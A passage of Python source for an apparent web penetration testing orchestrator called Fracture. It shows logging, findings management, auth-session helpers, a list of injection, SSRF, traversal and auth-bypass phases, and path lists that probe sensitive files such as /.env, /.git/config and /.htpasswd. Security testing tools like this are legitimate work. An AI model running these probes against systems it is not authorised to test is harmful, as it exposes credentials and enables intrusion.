# ── Selenium availability cache (checked once, lazily) ────────────────────────
_SELENIUM_AVAILABLE: "bool | None" = None

# ── Web file download constants ───────────────────────────────────────────────
_WEB_EXTS = frozenset({
    ".html", ".htm", ".php", ".asp", ".aspx", ".jsp", ".jsf",
    ".js", ".json", ".xml", ".txt", ".config", ".conf",
    ".yaml", ".yml", ".ini", ".env", ".bak", ".sql", ".css",
})
_WEB_WELL_KNOWN = [
    "/",
    "/robots.txt",
    "/sitemap.xml",
    "/.well-known/security.txt",
    "/crossdomain.xml",
    "/web.config",
    "/humans.txt",
]
_MAX_WEB_LINKS  = 50
_MAX_FILE_BYTES = 5 * 1024 * 1024   # 5 MB

# ChromeDriver / Chrome binary paths for screenshot support
_CHROMEDRIVER_PATHS: list = [
    "/opt/homebrew/bin/chromedriver",
    "/usr/local/bin/chromedriver",
    "/usr/bin/chromedriver",
    "/usr/bin/chromium-driver",
    "/usr/bin/chromium.chromedriver",
    "/usr/lib/chromium/chromedriver",
    "/usr/lib/chromium-browser/chromedriver",
    "/snap/bin/chromium.chromedriver",
    # macOS: chromedriver downloaded by tmp/ patch script
    "/private/tmp/chromedriver146/chromedriver-mac-x64/chromedriver",
]
_CHROME_BIN_PATHS_LINUX: list = [
    "/usr/bin/google-chrome",
    "/usr/bin/google-chrome-stable",
    "/usr/bin/chromium",
    "/usr/bin/chromium-browser",
    "/snap/bin/chromium",
    "/usr/bin/brave-browser",
]

colorama.init(autoreset=True)

# Suppress InsecureRequestWarning for self-signed certs
try:
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except Exception:
    try:
        requests.packages.urllib3.disable_warnings()
    except Exception:
        pass

# ── Thread-safety ─────────────────────────────────────────────────────────────
_PRINT_LOCK = threading.Lock()


def _tprint(*args, **kwargs):
    """Thread-safe wrapper for print()."""
    with _PRINT_LOCK:
        print(*args, **kwargs)


# ─────────────────────────────────────────────
# Vantage integration layer
# ─────────────────────────────────────────────
import queue as _queue
import uuid as _uuid

_VANTAGE_MANAGED = os.environ.get("CRUCIBLE_MANAGED", "") == "1"

_VP_LOG    = "__CRUCIBLE_LOG__:"
_VP_ERR    = "__CRUCIBLE_ERR__:"
_VP_PROMPT = "__CRUCIBLE_PROMPT__:"
_VP_STATUS = "__CRUCIBLE_STATUS__:"


class VantageConsole:
    """Dual-mode console output.

    When VANTAGE_MANAGED=1: emits protocol tokens that Vantage intercepts for
    structured logs, errors, prompts, and phase-status updates.
    When running in a real terminal: falls back to ANSI-coloured text.
    """

    def __init__(self) -> None:
        self._managed = _VANTAGE_MANAGED
        self._lock    = threading.Lock()

    @property
    def managed(self) -> bool:
        return self._managed

    def log(self, message: str, level: str = "INFO") -> None:
        with self._lock:
            if self._managed:
                entry = {
                    "ts":      datetime.now().isoformat(),
                    "level":   level,
                    "message": message,
                }
                sys.stdout.write(_VP_LOG + json.dumps(entry) + "\n")
                sys.stdout.flush()
            else:
                _colours = {
                    "INFO":    Fore.CYAN,
                    "SUCCESS": Fore.GREEN,
                    "WARNING": Fore.YELLOW,
                    "ERROR":   Fore.RED,
                    "DEBUG":   Fore.WHITE,
                }
                _tags = {
                    "INFO": "[*]", "SUCCESS": "[+]", "WARNING": "[~]",
                    "ERROR": "[!]", "DEBUG": "[.]",
                }
                c   = _colours.get(level, "")
                tag = _tags.get(level, "[*]")
                _tprint(f"{c}{tag}{Style.RESET_ALL} {message}")

    def error(self, message: str, source: str = "fracture",
              detail: str = "", category: str = "") -> None:
        with self._lock:
            if self._managed:
                entry = {
                    "ts":       datetime.now().isoformat(),
                    "source":   source,
                    "message":  message,
                    "detail":   detail,
                    "category": category or self._categorise(message),
                }
                sys.stderr.write(_VP_ERR + json.dumps(entry) + "\n")
                sys.stderr.flush()
            else:
                _tprint(f"{Fore.RED}[!] {message}{Style.RESET_ALL}")

    def status(self, phase: str, label: str = "", status: str = "running",
               step: str = "", progress: int = 0, total: int = 0,
               tools: "dict | None" = None) -> None:
        with self._lock:
            if self._managed:
                entry = {
                    "phase":    phase,
                    "label":    label or phase,
                    "status":   status,
                    "step":     step,
                    "progress": progress,
                    "total":    total,
                    "ts":       datetime.now().isoformat(),
                }
                if tools is not None:
                    entry["tools"] = tools
                sys.stdout.write(_VP_STATUS + json.dumps(entry) + "\n")
                sys.stdout.flush()

    def prompt(self, question: str, prompt_type: str = "text",
               options: list = None, skippable: bool = False) -> str:
        """Request user input. Blocks until an answer is received."""
        if self._managed:
            payload = {
                "id":        str(_uuid.uuid4()),
                "question":  question,
                "type":      prompt_type,
                "options":   options or [],
                "skippable": skippable,
            }
            with self._lock:
                sys.stdout.write(_VP_PROMPT + json.dumps(payload) + "\n")
                sys.stdout.flush()
            try:
                return sys.stdin.readline().rstrip("\n")
            except Exception:
                return ""
        else:
            if prompt_type == "password":
                return getpass.getpass(f"  {question}: ")
            elif options:
                _tprint(f"\n[?] {question}")
                for i, opt in enumerate(options, 1):
                    _tprint(f"    [{i}] {opt}")
                raw = input("    Select: ").strip()
                if raw.isdigit():
                    idx = int(raw) - 1
                    if 0 <= idx < len(options):
                        return options[idx]
                return raw
            else:
                return input(f"  [?] {question}: ").strip()

    @staticmethod
    def _categorise(msg: str) -> str:
        m = msg.lower()
        if any(k in m for k in ("connection", "socket", "timeout", "refused", "network", "unreachable")):
            return "Network"
        if any(k in m for k in ("tool", "binary", "not found", "command", "executable")):
            return "Tool"
        return "Scan"


class ProgressManager:
    """Thread-safe checkpoint manager for scan recovery."""

    def __init__(self, checkpoint_file: "str | Path") -> None:
        self._file  = Path(checkpoint_file)
        self._lock  = threading.Lock()
        self._state = self._load()

    def _load(self) -> dict:
        if self._file.exists():
            try:
                data = json.loads(self._file.read_text(encoding="utf-8"))
                data.setdefault("version", 1)
                data.setdefault("started", datetime.now().isoformat())
                data.setdefault("completed_phases", [])
                data.setdefault("phase_status", {})
                return data
            except Exception:
                pass
        return {
            "version":          1,
            "started":          datetime.now().isoformat(),
            "completed_phases": [],
            "phase_status":     {},
        }

    def _save(self) -> None:
        self._file.parent.mkdir(parents=True, exist_ok=True)
        fd, tmp = tempfile.mkstemp(dir=str(self._file.parent), suffix=".tmp")
        try:
            with os.fdopen(fd, "w", encoding="utf-8") as f:
                json.dump(self._state, f, indent=2)
            os.replace(tmp, str(self._file))
        except Exception:
            try:
                os.unlink(tmp)
            except Exception:
                pass

    def is_phase_complete(self, phase: str) -> bool:
        with self._lock:
            return phase in self._state.get("completed_phases", [])

    def set_phase_status(self, phase: str, status: str,
                         label: str = "", detail: str = "") -> None:
        with self._lock:
            self._state.setdefault("phase_status", {})[phase] = {
                "status":     status,
                "label":      label or phase,
                "detail":     detail,
                "updated_at": datetime.now().isoformat(),
            }
            if status == "complete":
                lst = self._state.setdefault("completed_phases", [])
                if phase not in lst:
                    lst.append(phase)
            self._save()

    def get_state(self) -> dict:
        with self._lock:
            return dict(self._state)


# ─────────────────────────────────────────────
# Subprocess helpers
# ─────────────────────────────────────────────
_POPEN_FLAGS: dict = {}
if platform.system() == "Windows":
    _POPEN_FLAGS["creationflags"] = subprocess.CREATE_NO_WINDOW  # type: ignore


def _run(cmd: list, **kwargs) -> subprocess.CompletedProcess:
    """Run a subprocess, suppressing console windows on Windows."""
    return subprocess.run(cmd, **{**_POPEN_FLAGS, **kwargs})


def _popen(cmd: list, **kwargs) -> subprocess.Popen:
    """Open a subprocess, suppressing console windows on Windows."""
    return subprocess.Popen(cmd, **{**_POPEN_FLAGS, **kwargs})


# ─────────────────────────────────────────────
# OutputManager
# ─────────────────────────────────────────────
_RE_UNSAFE_FNAME = re.compile(r'[^\w.\-]')


class OutputManager:
    """Manages the output directory tree for a Fracture scan."""

    TOOL_DIRS = [
        "recon", "tls", "headers", "crawl", "injection",
        "traversal", "ssrf", "auth_bypass", "files", "vulnscan",
        "graphql", "auth_recon", "authorization", "session", "csrf", "cross_user",
    ]

    FINDINGS_CSV_FIELDS = [
        "title", "datetime", "ip", "port", "hostname", "risk", "command",
        "description", "output", "cves", "sources", "service", "output_file",
        "affected", "exploitdb", "metasploit", "exploit_details",
        "owasp", "owasp_url", "nist", "remediation",
    ]

    _findings_lock: threading.Lock = threading.Lock()
    _log_lock:      threading.Lock = threading.Lock()

    def __init__(self, project_name: str) -> None:
        self.project_name = project_name
        self.root         = Path(project_name).resolve()
        self.log_file      = self.root / "scan.log"
        self.json_log_file = self.root / "scan.log.json"
        self.error_log     = self.root / "errors.log"
        self.findings_json = self.root / "findings.json"
        self.findings_csv  = self.root / "findings.csv"
        self.summary_json  = self.root / "summary.json"
        self._setup_dirs()

    def _setup_dirs(self) -> None:
        self.root.mkdir(parents=True, exist_ok=True)
        for d in self.TOOL_DIRS:
            (self.root / d).mkdir(exist_ok=True)
        if not self.log_file.exists():
            self._write_log_header()
        if not self.json_log_file.exists():
            self.json_log_file.write_text("[]\n", encoding="utf-8")
        if not self.error_log.exists():
            self._write_error_header()
        if not self.findings_json.exists():
            self.findings_json.write_text("[]\n", encoding="utf-8")
        if not self.findings_csv.exists():
            self._write_findings_csv_header()

    def _write_log_header(self) -> None:
        header = (
            f"{'='*70}\n"
            f"  fracture.py — Scan Log\n"
            f"  Project : {self.project_name}\n"
            f"  Created : {self._ts()}\n"
            f"  Host    : {platform.node()}  OS: {platform.system()} {platform.release()}\n"
            f"{'='*70}\n\n"
        )
        self.log_file.write_text(header, encoding="utf-8")

    def _write_error_header(self) -> None:
        header = (
            f"{'='*70}\n"
            f"  fracture.py — Error Log\n"
            f"  Project : {self.project_name}\n"
            f"  Created : {self._ts()}\n"
            f"{'='*70}\n\n"
        )
        self.error_log.write_text(header, encoding="utf-8")

    def _write_findings_csv_header(self) -> None:
        with self.findings_csv.open("w", newline="", encoding="utf-8") as f:
            writer = csv.DictWriter(f, fieldnames=self.FINDINGS_CSV_FIELDS, extrasaction="ignore")
            writer.writeheader()

    def _ts(self) -> str:
        return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    def _safe_filename(self, parts: list, ext: str) -> str:
        name = "_".join(str(p) for p in parts)
        name = _RE_UNSAFE_FNAME.sub("_", name)
        return f"{name}.{ext}"

    def output_path(self, phase: str, *parts) -> Path:
        fname = self._safe_filename(list(parts), "txt")
        return self.root / phase / fname

    def log_command(self, tool: str, command: "list | str", output_file: "Path | None",
                    extra: "dict | None" = None) -> None:
        ts      = self._ts()
        cmd_str = " ".join(command) if isinstance(command, list) else command
        out_str = str(output_file.relative_to(self.root)) if output_file else "n/a"
        lines   = [f"[{ts}] TOOL={tool}", f"  Command     : {cmd_str}", f"  Output file : {out_str}", ""]
        if extra:
            for k, v in extra.items():
                if v is not None:
                    lines.insert(2, f"  {k:<13} : {v}")
        with self._log_lock:
            with self.log_file.open("a", encoding="utf-8") as f:
                f.write("\n".join(lines) + "\n")

    def log_error(self, tool: str, command: "list | str", error: str) -> None:
        ts      = self._ts()
        cmd_str = " ".join(command) if isinstance(command, list) else command
        with self._log_lock:
            with self.error_log.open("a", encoding="utf-8") as f:
                f.write(f"[{ts}] ERROR  TOOL={tool}\n  Command : {cmd_str}\n  Error   : {error}\n\n")

    def add_finding(
        self,
        title: str,
        url: str,
        port: int,
        risk: str,
        description: str,
        output: str = "",
        cves: str = "",
        sources: str = "",
        service: str = "",
        output_file: str = "",
        affected: str = "",
        owasp: str = "",
        nist: str = "",
        remediation: str = "",
        command: str = "",
    ) -> None:
        """Record a security finding to findings.json and findings.csv. Thread-safe."""
        ts    = self._ts()
        title = _normalize_finding_title(title)
        ascii_title = title.encode("ascii", errors="replace").decode("ascii")

        # parse hostname from url
        try:
            _parsed  = urllib.parse.urlparse(url)
            hostname = _parsed.hostname or url
            _svc     = service or _parsed.scheme or "http"
        except Exception:
            hostname = url
            _svc     = service or "http"

        _owasp_name, _owasp_url = _owasp_resolve(owasp, title)
        entry = {
            "title":          title,
            "datetime":       ts,
            "ip":             url,
            "port":           int(port) if port else 0,
            "hostname":       hostname,
            "risk":           risk or "",
            "command":        command or "",
            "description":    description or "",
            "output":         output or "",
            "cves":           cves or "",
            "sources":        sources or "",
            "service":        _svc,
            "output_file":    output_file or "",
            "affected":       affected or url,
            "exploitdb":      False,
            "metasploit":     False,
            "exploit_details": [],
            "owasp":          _owasp_name or owasp or "",
            "owasp_url":      _owasp_url or "",
            "nist":           nist or "",
            "remediation":    remediation or "",
        }
        csv_entry = dict(entry)
        csv_entry["title"] = ascii_title

        with self._findings_lock:
            try:
                existing_all: list = json.loads(self.findings_json.read_text(encoding="utf-8"))
                if not isinstance(existing_all, list):
                    existing_all = []
            except Exception:
                existing_all = []

            _title_lower = title.strip().lower()
            _norm_key    = (_title_lower, url.strip(), int(port) if port else 0)
            merged       = False

            for ex in existing_all:
                ex_key = (
                    (ex.get("title") or "").strip().lower(),
                    (ex.get("ip") or "").strip(),
                    int(ex.get("port") or 0),
                )
                if ex_key == _norm_key:
                    # merge sources
                    if sources:
                        ex_srcs = set(s.strip() for s in (ex.get("sources") or "").split(",") if s.strip())
                        new_srcs = set(s.strip() for s in sources.split(",") if s.strip())
                        ex["sources"] = ",".join(sorted(ex_srcs | new_srcs))
                    # merge CVEs
                    if cves:
                        ex_cves = set(c.strip() for c in (ex.get("cves") or "").split(",") if c.strip())
                        new_cves = set(c.strip() for c in cves.split(",") if c.strip())
                        ex["cves"] = ",".join(sorted(ex_cves | new_cves))
                    # merge affected
                    if affected:
                        ex_aff = set(a.strip() for a in (ex.get("affected") or "").split("\n") if a.strip())
                        new_aff = set(a.strip() for a in affected.split("\n") if a.strip())
                        ex["affected"] = "\n".join(sorted(ex_aff | new_aff))
                    # merge output_file
                    if output_file:
                        ex_files = set(f.strip() for f in (ex.get("output_file") or "").split(",") if f.strip())
                        ex_files.add(output_file.strip())
                        ex["output_file"] = ",".join(sorted(ex_files))
                    # merge description
                    if description:
                        ex_desc  = (ex.get("description") or "").strip()
                        new_desc = description.strip()
                        if new_desc and new_desc not in ex_desc:
                            ex["description"] = f"{ex_desc}\n\n{new_desc}".strip() if ex_desc else new_desc
                    # escalate risk
                    _risk_rank = {"CRITICAL": 4, "HIGH": 3, "MEDIUM": 2, "LOW": 1, "INFO": 0}
                    if _risk_rank.get((risk or "").upper(), 0) > _risk_rank.get((ex.get("risk") or "").upper(), 0):
                        ex["risk"] = risk
                    merged = True
                    break

            if not merged:
                existing_all.append(entry)

            # atomic write JSON
            tmp = self.findings_json.with_suffix(".tmp")
            tmp.write_text(json.dumps(existing_all, indent=2), encoding="utf-8")
            tmp.replace(self.findings_json)

            # append CSV only for new entries
            if not merged:
                with self.findings_csv.open("a", newline="", encoding="utf-8") as f:
                    writer = csv.DictWriter(f, fieldnames=self.FINDINGS_CSV_FIELDS, extrasaction="ignore")
                    writer.writerow(csv_entry)

    def write_summary(self, meta: dict) -> None:
        """Write scan summary JSON."""
        try:
            findings = json.loads(self.findings_json.read_text(encoding="utf-8"))
        except Exception:
            findings = []
        counts = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0}
        for f in findings:
            r = (f.get("risk") or "INFO").upper()
            counts[r] = counts.get(r, 0) + 1
        summary = {
            "tool":        "fracture",
            "version":     VERSION,
            "generated":   datetime.now().isoformat(),
            "total_findings": len(findings),
            "risk_counts": counts,
            **meta,
        }
        tmp = self.summary_json.with_suffix(".tmp")
        tmp.write_text(json.dumps(summary, indent=2), encoding="utf-8")
        tmp.replace(self.summary_json)


# ─────────────────────────────────────────────
# Banner
# ─────────────────────────────────────────────
_BANNER = r"""
  ███████╗██████╗  █████╗  ██████╗████████╗██╗   ██╗██████╗ ███████╗
  ██╔════╝██╔══██╗██╔══██╗██╔════╝╚══██╔══╝██║   ██║██╔══██╗██╔════╝
  █████╗  ██████╔╝███████║██║        ██║   ██║   ██║██████╔╝█████╗
  ██╔══╝  ██╔══██╗██╔══██║██║        ██║   ██║   ██║██╔══██╗██╔══╝
  ██║     ██║  ██║██║  ██║╚██████╗   ██║   ╚██████╔╝██║  ██║███████╗
  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝
"""

# ─────────────────────────────────────────────
# Module-level singletons
# ─────────────────────────────────────────────
vc: VantageConsole = VantageConsole()
_active_procs: list = []
_procs_lock = threading.Lock()


def _register_proc(proc: subprocess.Popen) -> None:
    with _procs_lock:
        _active_procs.append(proc)


def _deregister_proc(proc: subprocess.Popen) -> None:
    with _procs_lock:
        try:
            _active_procs.remove(proc)
        except ValueError:
            pass


def _signal_handler(sig, frame) -> None:
    vc.log("Interrupted — killing subprocesses and saving checkpoint ...", "WARNING")
    with _procs_lock:
        for p in _active_procs:
            try:
                p.terminate()
            except Exception:
                pass
    sys.exit(0)


signal.signal(signal.SIGINT,  _signal_handler)
signal.signal(signal.SIGTERM, _signal_handler)


# ─────────────────────────────────────────────
# Shared HTTP session factory
# ─────────────────────────────────────────────
def _make_session(cfg: dict) -> requests.Session:
    sess = requests.Session()
    sess.verify  = cfg.get("verify_ssl", False)
    ua           = cfg.get("user_agent", "Mozilla/5.0 (compatible; Fracture/1.0; Security Assessment)")
    sess.headers.update({"User-Agent": ua})
    extra = cfg.get("extra_headers", {})
    if extra:
        sess.headers.update(extra)
    proxy = cfg.get("proxy", "")
    if proxy:
        sess.proxies = {"http": proxy, "https": proxy}
    return sess


def _build_auth_session(cfg: dict, auth_key: str = "auth") -> "requests.Session | None":
    """Return an authenticated session or None if auth not enabled."""
    auth = cfg.get(auth_key, {})
    if not auth.get("enabled"):
        return None
    sess = _make_session(cfg)
    token = auth.get("auth_token", "")
    if token:
        ttype = auth.get("token_type", "Bearer")
        sess.headers["Authorization"] = f"{ttype} {token}"
        return sess
    cookie = auth.get("session_cookie", "")
    if cookie:
        for pair in cookie.split(";"):
            pair = pair.strip()
            if "=" in pair:
                k, v = pair.split("=", 1)
                sess.cookies.set(k.strip(), v.strip())
        return sess
    auth_type  = auth.get("auth_type", "form")
    login_url  = auth.get("login_url", "")
    username   = auth.get("username", "")
    password   = auth.get("password", "")
    if auth_type == "form" and login_url and username:
        login_data_str = auth.get("login_data", "")
        if login_data_str:
            try:
                login_data = json.loads(login_data_str)
            except Exception:
                login_data = dict(p.split("=", 1) for p in login_data_str.split("&") if "=" in p)
        else:
            login_data = {"username": username, "password": password}
        try:
            sess.post(login_url, data=login_data, timeout=cfg.get("timeout", 10), allow_redirects=True)
        except Exception:
            pass
        return sess
    if auth_type == "basic" and username:
        sess.auth = (username, password)
        return sess
    return sess


# ─────────────────────────────────────────────
# URL helpers
# ─────────────────────────────────────────────
def _parse_target(url: str) -> dict:
    p = urllib.parse.urlparse(url)
    scheme   = p.scheme or "http"
    hostname = p.hostname or url
    port     = p.port or (443 if scheme == "https" else 80)
    is_https = scheme == "https"
    return {
        "url":      url.rstrip("/"),
        "scheme":   scheme,
        "hostname": hostname,
        "port":     port,
        "is_https": is_https,
        "host_port": f"{hostname}:{port}",
    }


def _same_origin(base_url: str, candidate: str) -> bool:
    try:
        b = urllib.parse.urlparse(base_url)
        c = urllib.parse.urlparse(candidate)
        return b.netloc == c.netloc
    except Exception:
        return False


def _normalize_url(base: str, href: str) -> "str | None":
    try:
        joined = urllib.parse.urljoin(base, href)
        p      = urllib.parse.urlparse(joined)
        if p.scheme not in ("http", "https"):
            return None
        return joined.rstrip("/") if not p.path or p.path == "/" else joined
    except Exception:
        return None


# ─────────────────────────────────────────────
# Default settings
# ─────────────────────────────────────────────
DEFAULT_SETTINGS: dict = {
    "engagement": {
        "consultant":       "",
        "client_name":      "",
        "client_short":     "",
        "consultant_email": "",
        "start_date":       "",
        "end_date":         "",
    },
    "scan": {
        "project":          "",
        "target_url":       "",
        "target_urls":      [],
        "wordlist":         "/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt",
        "threads":          30,
        "timeout":          10,
        "follow_redirects": True,
        "user_agent":       "Mozilla/5.0 (compatible; Fracture/1.0; Security Assessment)",
        "extra_headers":    {},
        "proxy":            "",
        "verify_ssl":       False,
        "phases": {
            "recon": True, "screenshot": True, "webfiles": True,
            "tls": True, "headers": True, "shcheck": True,
            "ffuf": True, "crawl": True, "jwt": True,
            "injection": True, "traversal": True, "ssrf": True,
            "auth_bypass": True, "files": True, "vulnscan": True,
            "graphql": False, "auth_recon": False, "authorization": False,
            "session": False, "csrf": False, "cross_user": False,
        },
        "auth": {
            "enabled": False, "username": "", "password": "",
            "auth_type": "form", "login_url": "", "login_data": "",
            "auth_token": "", "token_type": "Bearer", "session_cookie": "",
        },
        "auth2": {
            "enabled": False, "username": "", "password": "",
            "auth_token": "", "session_cookie": "",
        },
        "sqlmap_timeout":   300,
        "nuclei_timeout":   600,
        "crawl_depth":      3,
        "crawl_max_pages":  150,
        "gobuster_wordlist": "/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt",
        "ffuf_vhost_wordlist": "/usr/share/seclists/Discovery/DNS/namelist.txt",
        "ffuf_param_wordlist": "/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt",
        "wpscan_token":     "",
    },
}


def _load_settings(path: str) -> dict:
    import copy
    settings = copy.deepcopy(DEFAULT_SETTINGS)
    if path:
        try:
            with open(path, encoding="utf-8") as f:
                user = json.load(f)
            # deep merge scan section
            for k, v in user.get("engagement", {}).items():
                settings["engagement"][k] = v
            for k, v in user.get("scan", {}).items():
                if isinstance(v, dict) and isinstance(settings["scan"].get(k), dict):
                    settings["scan"][k].update(v)
                else:
                    settings["scan"][k] = v
        except Exception as e:
            vc.log(f"Could not load settings from {path}: {e}", "WARNING")
    return settings


# ─────────────────────────────────────────────
# Argument parsing
# ─────────────────────────────────────────────
PHASE_LIST = [
    ("recon",         "Phase 0:  HTTP probe, fingerprinting, directory discovery"),
    ("tls",           "Phase 1:  TLS/SSL cipher and certificate analysis"),
    ("headers",       "Phase 2:  Security header inspection"),
    ("crawl",         "Phase 3:  Crawl, form extraction, JS secret hunting"),
    ("injection",     "Phase 4:  SQLi, XSS, SSTI, CMDi, CRLF, XXE"),
    ("traversal",     "Phase 5:  Path traversal / LFI"),
    ("ssrf",          "Phase 6:  Server-Side Request Forgery"),
    ("auth_bypass",   "Phase 7:  Authentication bypass / default creds"),
    ("files",         "Phase 8:  Sensitive file exposure"),
    ("vulnscan",      "Phase 9:  Nuclei + Nikto vulnerability scan"),
    ("graphql",       "Phase 10: GraphQL endpoint detection and introspection"),
    ("auth_recon",    "Phase 11: Authenticated endpoint enumeration (requires auth)"),
    ("authorization", "Phase 12: IDOR / privilege escalation testing (requires auth)"),
    ("session",       "Phase 13: Session management analysis (requires auth)"),
    ("csrf",          "Phase 14: CSRF protection testing (requires auth)"),
    ("cross_user",    "Phase 15: Cross-user data leakage (requires auth + auth2)"),
]


def _parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        prog="fracture.py",
        description="Fracture — Web Application Penetration Testing Orchestrator",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("--settings",      metavar="FILE", help="Path to JSON settings file")
    parser.add_argument("--url",           metavar="URL",  help="Target URL (inline mode)")
    parser.add_argument("--project",       metavar="DIR",  help="Output directory", default="")
    parser.add_argument("--fast",          action="store_true", help="Skip slow phases (vulnscan, sqlmap)")
    parser.add_argument("--resume",        action="store_true", help="Resume from checkpoint")
    parser.add_argument("--no-injection",  action="store_true", help="Skip injection phase")
    parser.add_argument("--no-vulnscan",   action="store_true", help="Skip nuclei vulnscan")
    parser.add_argument("--no-auth",       action="store_true", help="Skip all authenticated phases")
    parser.add_argument("--list-phases",   action="store_true", help="Print phases and exit")
    parser.add_argument("--username",      metavar="USER", help="Auth username")
    parser.add_argument("--password",      metavar="PASS", help="Auth password")
    parser.add_argument("--auth-type",     metavar="TYPE", default="form", help="Auth type: form/basic/token")
    parser.add_argument("--login-url",     metavar="URL",  help="Login endpoint URL")
    parser.add_argument("--auth-token",    metavar="TOKEN", help="Bearer/API token")
    parser.add_argument("--threads",       type=int, default=None, help="Number of threads")
    parser.add_argument("--timeout",       type=int, default=None, help="Request timeout in seconds")
    return parser.parse_args()


# =============================================================================
# PHASE IMPLEMENTATIONS
# =============================================================================

# ─────────────────────────────────────────────
# Phase 0: Recon
# ─────────────────────────────────────────────
_CMS_PATTERNS = {
    "WordPress": [re.compile(r'wp-content|wp-includes|wordpress', re.I)],
    "Drupal":    [re.compile(r'Drupal|drupal\.js|sites/default', re.I)],
    "Joomla":    [re.compile(r'Joomla|/components/com_', re.I)],
    "Django":    [re.compile(r'csrfmiddlewaretoken|django', re.I)],
    "Laravel":   [re.compile(r'laravel_session|Laravel', re.I)],
    "Rails":     [re.compile(r'_rails_|authenticity_token', re.I)],
    "Express":   [re.compile(r'X-Powered-By.*Express', re.I)],
}
_SERVER_PATTERNS = {
    "Apache": re.compile(r'Apache', re.I),
    "Nginx":  re.compile(r'nginx', re.I),
    "IIS":    re.compile(r'Microsoft-IIS', re.I),
    "Tomcat": re.compile(r'Apache Tomcat|Tomcat', re.I),
}
_LANG_PATTERNS = {
    "PHP":    re.compile(r'\.php|X-Powered-By.*PHP|PHPSESSID', re.I),
    "ASP.NET": re.compile(r'ASP\.NET|__VIEWSTATE|\.aspx', re.I),
    "Ruby":   re.compile(r'Ruby|_session_id', re.I),
    "Python": re.compile(r'Python|Django|Flask|Werkzeug', re.I),
    "Java":   re.compile(r'JSESSIONID|\.jsp|Servlet', re.I),
}
_ADMIN_PATHS = [
    "/admin", "/administrator", "/wp-admin", "/phpmyadmin", "/manager",
    "/dashboard", "/portal", "/cpanel", "/webadmin", "/admin.php",
    "/admincp", "/admin/login", "/admin/dashboard", "/backend",
]
_COMMON_PATHS = [
    "/.well-known/security.txt", "/.well-known/openid-configuration",
    "/api/", "/v1/", "/v2/", "/swagger", "/swagger-ui.html",
    "/api/swagger.json", "/openapi.json", "/.git/HEAD", "/.env", "/robots.txt",
]
_TOP_200_PATHS = [
    "/index.php", "/index.html", "/login", "/login.php", "/register", "/logout",
    "/profile", "/user", "/users", "/account", "/api", "/api/v1", "/api/v2",
    "/admin", "/administrator", "/config", "/settings", "/setup", "/install",
    "/backup", "/test", "/dev", "/debug", "/info", "/search", "/upload",
    "/uploads", "/files", "/images", "/static", "/assets",
    "/robots.txt", "/sitemap.xml", "/.htaccess", "/.env",
    "/wp-content", "/wp-includes", "/wp-login.php", "/wp-admin",
    "/phpmyadmin", "/pma", "/db", "/database", "/server-status", "/server-info",
    "/status", "/health", "/metrics", "/actuator", "/actuator/health",
    "/phpinfo.php", "/info.php", "/test.php", "/old", "/bak",
    "/.git/HEAD", "/.git/config", "/.svn", "/.DS_Store",
    "/crossdomain.xml", "/clientaccesspolicy.xml",
    "/composer.json", "/package.json", "/requirements.txt",
    "/web.config", "/.htpasswd", "/console", "/shell", "/private", "/internal",
]


def _phase_recon(target: dict, cfg: dict, pm: ProgressManager,
                 out: OutputManager, sess: requests.Session) -> None:
    url     = target["url"]
    timeout = cfg.get("timeout", 10)
    phase   = "recon"
    vc.status(phase, "Recon", "running", "HTTP probe", 0, 10)

    # Wildcard detection — run before any path-based checks so brute-forcers
    # can be skipped and individual URL findings can be validated.
    vc.status(phase, "Recon", "running", "Wildcard probe", 0, 10)
    wc_baseline = _detect_wildcard(url, sess, timeout)
    if wc_baseline is not None:
        vc.log(
            f"[recon] Wildcard/catch-all detected (HTTP {wc_baseline['status']} "
            f"for all paths{'; redirect → ' + wc_baseline['location'] if wc_baseline.get('redirect') else ''}). "
            "Directory brute-forcing skipped; all path findings will be validated against baseline.",
            "WARNING",
        )

    try:
        resp        = sess.get(url, timeout=timeout, allow_redirects=True)
        status_code = resp.status_code
        headers     = resp.headers
        body        = resp.text[:50000]
    except Exception as e:
        vc.log(f"[recon] Could not connect to {url}: {e}", "ERROR")
        out.log_error("recon-probe", url, str(e))
        return

    vc.log(f"[recon] {url} → HTTP {status_code}", "INFO")
    server_hdr  = headers.get("Server", "")
    powered_by  = headers.get("X-Powered-By", "")
    all_text    = body + " ".join(f"{k}: {v}" for k, v in headers.items())

    # Save initial HTTP probe response as evidence
    probe_out = out.output_path(phase, "http_probe_" + target["hostname"])
    probe_out.write_text(
        "\n".join(f"{k}: {v}" for k, v in headers.items())
        + f"\n\nHTTP {status_code}\n\n{body[:10000]}",
        encoding="utf-8",
    )

    detected_cms = [n for n, pats in _CMS_PATTERNS.items()
                    if any(p.search(all_text) for p in pats)]

    if server_hdr:
        out.add_finding(
            title="Web Server Version Disclosed in Header",
            url=url, port=target["port"], risk="LOW",
            description=f"The Server response header discloses the web server: '{server_hdr}'.",
            output=f"Server: {server_hdr}", sources="fracture-recon",
            service=target["scheme"], output_file=str(probe_out),
            owasp="A05:2025 Security Misconfiguration", nist="SI-2",
            remediation="Suppress or genericise the Server header.",
        )
    if powered_by:
        out.add_finding(
            title="Technology Disclosed via X-Powered-By Header",
            url=url, port=target["port"], risk="LOW",
            description=f"X-Powered-By reveals: '{powered_by}'.",
            output=f"X-Powered-By: {powered_by}", sources="fracture-recon",
            service=target["scheme"], output_file=str(probe_out),
            owasp="A05:2025 Security Misconfiguration", nist="SI-2",
            remediation="Remove the X-Powered-By header.",
        )
    for cms in set(detected_cms):
        vc.log(f"[recon] CMS detected: {cms}", "SUCCESS")

    vc.status(phase, "Recon", "running", "Tech fingerprint (whatweb)", 1, 10)
    _ww_versions: list = []   # [(name, version_str)] collected for searchsploit
    whatweb = _find_tool("whatweb")
    if whatweb:
        ww_out = out.output_path(phase, "whatweb_" + target["hostname"])
        cmd = [whatweb, f"--log-json={ww_out}", "-a", "3", "--quiet", "--no-errors", url]
        vc.log("[recon] Running whatweb ...", "INFO")
        try:
